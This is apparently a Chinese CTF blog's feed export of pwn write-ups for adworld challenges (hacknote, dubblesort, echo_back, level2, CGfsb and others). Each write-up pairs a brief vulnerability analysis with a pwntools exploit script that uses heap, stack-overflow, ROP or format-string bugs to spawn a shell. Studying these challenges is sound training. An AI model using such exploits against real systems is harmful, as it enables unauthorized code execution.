src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230407191836911.png" alt="image-20230407191836911"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&quot;i386&quot;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-number">57590</span>)<br>libc = ELF(<span class="hljs-string">&quot;libc_32.so.6&quot;</span>)<br><span class="hljs-comment">#p = process(&quot;./hacknote&quot;)</span><br><span class="hljs-comment">#libc=elf.libc</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BK</span>():<br>    gdb.attach(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice :&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Print</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice :&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Del</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice :&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br>Add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;zzzz&quot;</span>)          <br>Add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;zzzz&quot;</span>)<br>Del(<span class="hljs-number">0</span>)                   <span class="hljs-comment">#free指针堆0、数据堆0，分别进入不同的fastbin</span><br>Del(<span class="hljs-number">1</span>)                   <span class="hljs-comment">#free指针堆1、数据堆1，分别进入不同的fastbin</span><br>puts_func_addr = <span class="hljs-number">0x804862B</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>payload = p32(puts_func_addr) + p32(puts_got)<br>Add(<span class="hljs-number">0x8</span>, payload)                                          <span class="hljs-comment">#使指针堆2=free指针堆1、数据堆2=free指针堆0，写入指针堆0数据</span><br>Print(<span class="hljs-number">0</span>)<span class="hljs-comment">#puts puts_got地址</span><br>libc_base = u32(p.recv(<span class="hljs-number">4</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>Del(<span class="hljs-number">2</span>)                                                   <span class="hljs-comment">#free 2</span><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>payload = p32(system_addr) + <span class="hljs-string">b&quot;||sh&quot;</span>           <br>Add(<span class="hljs-number">0x8</span>, payload)                                        <span class="hljs-comment">#再次申请写入sh</span><br>Print(<span class="hljs-number">0</span>)                                                 <span class="hljs-comment">#执行system(&#x27;*system_addr||sh&#x27;)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="format2"><a href="#format2" class="headerlink" title="format2"></a>format2</h3><h4 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h4><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230408112655776.png" alt="image-20230408112655776"></p><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230408112717959.png" alt="image-20230408112717959"></p><p>思路：auth函数存在栈溢出，但是只能溢出到ebp，但是auth函数和main函数存在两次<em>leave;ret</em>。使用frame faking，使rip指向&amp;input-0x4位置，其中布置好后门地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> base64<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>system_addr=<span class="hljs-number">0x08049284</span><br>input_addr=<span class="hljs-number">0x0811EB40</span><br>io = process(<span class="hljs-string">&quot;./123&quot;</span>)<br><span class="hljs-comment">#io = remote(&quot;61.147.171.105&quot;, 52218)</span><br>paload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(system_addr)+p32(input_addr)<br>io.sendline(base64.b64encode(paload))<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h3><h4 id="逻辑错误发生溢出"><a href="#逻辑错误发生溢出" class="headerlink" title="逻辑错误发生溢出"></a>逻辑错误发生溢出</h4><p>read读取数据到缓冲区前，未初始化，没有使用‘\x00’截断，造成数据泄漏；</p><p>代码中，scanf函数接收的数据格式为无符号整型%u。“+”和“-”即是合法字符，又不会修改栈上的数据，同时不会影响之后的输入。</p><img src="image-20230409090124939.png" alt="image-20230409090124939" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><br>context(arch = <span class="hljs-string">&quot;i386&quot;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)  <br>sh = process(<span class="hljs-string">&#x27;./dubblesort&#x27;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">&quot;./libc_32.so.6&quot;</span>&#125;)  <br><span class="hljs-comment">#sh = remote(&#x27;61.147.171.105&#x27;, 49333)  </span><br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)  <br>off = <span class="hljs-number">0x1AE244</span>  <br><span class="hljs-comment">#padding获得libc地址</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1C</span>  <br>sh.sendafter(<span class="hljs-string">&#x27;name :&#x27;</span>,payload)<br>sh.recvuntil(payload)<br><span class="hljs-comment">#得到libc基址</span><br>libc_base = u32(sh.recv(<span class="hljs-number">4</span>)) - off  <br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]  <br>binsh_addr = libc_base + libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()    <br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base=&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base)  <br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;system_addr=&#x27;</span>,<span class="hljs-built_in">hex</span>(system_addr)  <br><br>sh.sendlineafter(<span class="hljs-string">&#x27;sort :&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">35</span>))  <br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):  <br>   sh.sendlineafter(<span class="hljs-string">&#x27;number :&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))  <br><span class="hljs-comment">#跳过canary</span><br>sh.sendlineafter(<span class="hljs-string">&#x27;number :&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>)  <br><span class="hljs-comment">#填充到ebp 7，+1sysem地址，+1system返回地址</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):  <br>   sh.sendlineafter(<span class="hljs-string">&#x27;number :&#x27;</span>,<span class="hljs-built_in">str</span>(system_addr))  <br>sh.sendlineafter(<span class="hljs-string">&#x27;number :&#x27;</span>,<span class="hljs-built_in">str</span>(binsh_addr)) <br>sh.interactive() <br></code></pre></td></tr></table></figure><h3 id="echo-back⭐⭐"><a href="#echo-back⭐⭐" class="headerlink" title="echo_back⭐⭐"></a>echo_back⭐⭐</h3><h4 id="格式化字符串、利用scanf内部结构写数据"><a href="#格式化字符串、利用scanf内部结构写数据" class="headerlink" title="格式化字符串、利用scanf内部结构写数据"></a>格式化字符串、利用scanf内部结构写数据</h4><p>太难&#x3D; &#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>local=<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>    sh=process(<span class="hljs-string">&#x27;./echo_back&#x27;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">&quot;./libc.so.6&quot;</span>&#125;)<br>    libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    sh=remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>, <span class="hljs-number">63480</span>)<br>    libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>main_addr=<span class="hljs-number">0xC6C</span><br>pop_rdi_addr=<span class="hljs-number">0xD93</span><br>stdin_libc=libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>libc_start_main_libc=libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system_libc=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh_libc=libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params">name</span>):<br>    sh.sendlineafter(<span class="hljs-string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.sendafter(<span class="hljs-string">&#x27;name:&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">echoBack</span>(<span class="hljs-params">string,length=<span class="hljs-string">&#x27;7\n&#x27;</span></span>):<br>    sh.sendlineafter(<span class="hljs-string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sh.sendafter(<span class="hljs-string">&#x27;length:&#x27;</span>,length)<br>    sh.send(string)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">end</span>():<br>    sh.sendlineafter(<span class="hljs-string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-comment">#得到libc加载地址</span><br>echoBack(<span class="hljs-string">&#x27;%19$p\n&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_start_main_addr=<span class="hljs-built_in">int</span>(sh.recvline(),<span class="hljs-number">16</span>)-<span class="hljs-number">0xF0</span><br>libc_base=libc_start_main_addr-libc_start_main_libc<br>system_addr=libc_base+system_libc<br>bin_sh_addr=libc_base+bin_sh_libc<br>stdin_addr=libc_base+stdin_libc<br>buf_base=stdin_addr+<span class="hljs-number">0x8</span>*<span class="hljs-number">7</span><br><span class="hljs-comment">#得到elf的加载地址</span><br>echoBack(<span class="hljs-string">&#x27;%13$p\n&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>elf_base=<span class="hljs-built_in">int</span>(sh.recvline(),<span class="hljs-number">16</span>)-<span class="hljs-number">0x9C</span>-main_addr<br>pop_rdi_addr+=elf_base<br><span class="hljs-comment">#得到存放main 返回地址的栈地址</span><br>echoBack(<span class="hljs-string">&#x27;%12$p\n&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>main_ret_addr=<span class="hljs-built_in">int</span>(sh.recvline(),<span class="hljs-number">16</span>)+<span class="hljs-number">0x8</span><br><span class="hljs-comment">#覆盖IO_buf_base低字节，指向IO_write_base</span><br>setName(p64(buf_base))<br>echoBack(<span class="hljs-string">&#x27;%16$hhn&#x27;</span>)<br><span class="hljs-comment">#修改_IO_2_1_stdin_结构体</span><br>payload=p64(stdin_addr+<span class="hljs-number">0x83</span>)*<span class="hljs-number">3</span>+p64(main_ret_addr)+p64(main_ret_addr+<span class="hljs-number">0x18</span>)<br>echoBack(<span class="hljs-string">&#x27;\n&#x27;</span>,payload)<br><span class="hljs-comment">#调用getchar()使 fp-&gt;_IO_read_ptr 与使 fp-&gt;_IO_read_end 相等</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">1</span>):<br>    sh.sendlineafter(<span class="hljs-string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sh.sendlineafter(<span class="hljs-string">&#x27;length:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#写入rop</span><br>payload=p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)<br>echoBack(<span class="hljs-string">&#x27;\n&#x27;</span>,payload)<br>end()<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwn</title>
    <link href="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/"/>
    <url>/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/</url>
    
    <content type="html"><![CDATA[<h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h3><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><img src="image-20230315195608000.png" alt="image-20230315195608000" style="zoom:50%;" /><p>当dword_60106C等于’nuaa‘(1853186401)时，进入sub_00686函数，并获得flag。</p><img src="image-20230315195847548.png" alt="image-20230315195847548" style="zoom:50%;" /><p>unk_601068与dword_60106C相隔4个字节，而read函数可以读16个字节，可以通过覆盖的方式来改变dword_60106C的值，来进入函数获得flag。</p><p>方法一：nc连接，输入<code>aaaaaaun</code>，获取flag。注意覆盖存储使用<strong>小端序</strong></p><p>方法二：脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-string">&quot;61941&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;lets get helloworld for bof&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p64(<span class="hljs-number">1853186401</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><img src="image-20230315203113766.png" alt="image-20230315203113766" style="zoom:50%;" /><p>buf的长度为128个字节（也就是0x80）但是read()函数允许往buf中输入<strong>0x200</strong>字节数据，存在栈溢出漏洞。</p><img src="image-20230315204848090.png" alt="image-20230315204848090" style="zoom:50%;" /><p>思路：</p><ol><li>向buf处输入0x80字节的数据填满buf，此时在继续输入0x8字节的数据造成溢出覆盖ebp处的数据。</li><li>再继续输入数据把返回地址处的数据覆盖为callsystem()的地址，这样vulnerable_function()函数原本要返回到main()函数但是却返回到了callsystem()函数来执行callsystem()</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-string">&#x27;62544&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Hello, World\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x400596</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><h4 id="构造ROP链"><a href="#构造ROP链" class="headerlink" title="构造ROP链"></a>构造ROP链</h4><p><strong>ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>buf所占的空间大小为0x88字节，但read函数读取0x100字节，存在栈溢出。且没有开canary保护，可以一直向下溢出到ret返回的地址。返回的地址可以构造system函数，并让system函数执行“&#x2F;bin&#x2F;sh”。</p><img src="image-20230316111653391.png" alt="image-20230316111653391" style="zoom:50%;" /><img src="image-20230316112304941.png" alt="image-20230316112304941" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-string">&quot;59089&quot;</span>)<br>system = <span class="hljs-number">0x08048320</span><br>bin_sh = <span class="hljs-number">0x0804A024</span><br>p.recvuntil(<span class="hljs-string">b&quot;Input:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x8c</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(bin_sh))  <span class="hljs-comment">#p32(0)是system返回地址</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h3><h4 id="格式化字符串-覆盖任意地址内存"><a href="#格式化字符串-覆盖任意地址内存" class="headerlink" title="格式化字符串-覆盖任意地址内存"></a>格式化字符串-覆盖任意地址内存</h4><p>用<code>printf</code>格式化字符串漏洞<code>addr+%N$n</code>修改任意地址的值</p><img src="image-20230317194442641.png" alt="image-20230317194442641" style="zoom:67%;" /><p>cccc对应的636363是第10个参数</p><p><img src="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/image-20230317194628578.png" alt="image-20230317194628578"></p><p>pwnme所在地址为0x0804A068</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>r=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br><span class="hljs-comment">#r=remote(&#x27;61.147.171.105&#x27;,&#x27;58540&#x27;) </span><br>r.recvuntil(<span class="hljs-string">&quot;please tell me your name:&quot;</span>)<br>r.sendline(<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;leave your message please:&quot;</span>)<br>payload=p32(<span class="hljs-number">0x0804A068</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">b&#x27;%10$n&#x27;</span>  <span class="hljs-comment">#b&#x27;a&#x27;*4是为了和地址凑8字节</span><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl">%d - 十进制 - 输出十进制整数<br>%s - 字符串 - 从内存中读取字符串<br>%x - 十六进制 - 输出十六进制数<br>%c - 字符 - 输出字符<br>%p - 指针 - 指针地址<br>%n - 到目前为止所写的字符数，将%n之前<span class="hljs-keyword">printf</span>已经打印的字符个数赋值给指针所指向的地址；<br>而%hn表示写入的地址空间为<span class="hljs-number">2</span>字节，%hhn表示写入的地址空间为<span class="hljs-number">1</span>字节，%lln表示写入的地址空间为<span class="hljs-number">8</span>字节。<br>%N$n：将%n之前<span class="hljs-keyword">printf</span>已经打印的字符个数赋值给<span class="hljs-keyword">printf</span>的第n个参数<br></code></pre></td></tr></table></figure><p>参考：<a href="https://www.jianshu.com/p/097e211cd9eb">https://www.jianshu.com/p/097e211cd9eb</a></p><h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><h4 id="栈溢出以及伪随机数"><a href="#栈溢出以及伪随机数" class="headerlink" title="栈溢出以及伪随机数"></a>栈溢出以及伪随机数</h4><p><strong>rand()函数产生的是伪随机数，依靠srand()来产生随机数。如果srand()的参数相同 那么rand产生的随机数相同。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+Ch] [rbp-34h]</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h] BYREF                            //0x30-0x10=0x20</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+38h] [rbp-8h]   </span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0LL</span>);<br>  v4 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  *(_QWORD *)seed = <span class="hljs-built_in">sub_BB0</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------------------------------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to a guess number game!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------------------------------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please let me know your name!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your name:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(v7);                   <span class="hljs-comment">//在这里溢出，覆盖seed的值让每次的伪随机数都可知</span><br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>  &#123;<br>    v6 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input your guess number:&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;---------------------------------&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( v4 != v6 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;GG!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span 